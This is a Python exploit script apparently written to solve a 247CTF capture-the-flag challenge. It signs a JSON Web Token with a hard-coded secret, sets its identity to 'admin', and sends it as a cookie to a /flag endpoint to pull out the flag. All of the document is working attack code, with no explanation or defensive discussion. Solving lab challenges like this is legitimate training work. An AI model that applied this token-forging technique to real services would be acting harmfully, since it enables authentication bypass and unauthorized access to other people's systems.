
```python
import requests
import jwt
import json
import re

class JWTFinalExploit:
    def __init__(self, base_url='https://1a0d0fb8dc562a9c.247ctf.com'):
        self.base_url = base_url
        self.session = requests.Session()
        self.cookie_name = 'access_token_cookie'
        self.jwt_secret = 'wepwn247'

    def forge_admin_token(self):
        payload = {
            'csrf': '5903e7dc-e1b1-4452-a54e-8d016ec40894',
            'jti': 'admin-forge-token',
            'exp': 1743463446,
            'fresh': False,
            'iat': 1743462546,
            'type': 'access',
            'nbf': 1743462546,
            'identity': 'admin'
        }
        try:
            token = jwt.encode(payload, self.jwt_secret, algorithm='HS256')
            return token
        except Exception as e:
            print(f"Token forge error: {e}")
            return None

    def retrieve_flag(self, token):
        try:
            response = self.session.get(
                f'{self.base_url}/flag', 
                cookies={self.cookie_name: token},
                allow_redirects=True
            )
            print(f"[+] Response Status: {response.status_code}")
            flag_match = re.search(r'CTF{[^}]+}', response.text)
            if flag_match:
                return flag_match.group(0)
            return response.text
        
        except Exception as e:
            print(f"Flag retrieval error: {e}")
            return None

    def exploit(self):
        print("[*] Starting JWT Exploitation")
        print("[+] Forging Admin Token")
        admin_token = self.forge_admin_token()
        if not admin_token:
            print("[-] Failed to forge admin token")
            return
        print("[+] Forged Admin Token:")
        print(admin_token)
        print("\n[*] Attempting Flag Retrieval")
        flag = self.retrieve_flag(admin_token)
        if flag:
            print("\n[=== FLAG FOUND ===]")
            print(flag)
        else:
            print("\n[-] Failed to retrieve flag")

def main():
    exploiter = JWTFinalExploit()
    exploiter.exploit()

if __name__ == '__main__':
    main()
```
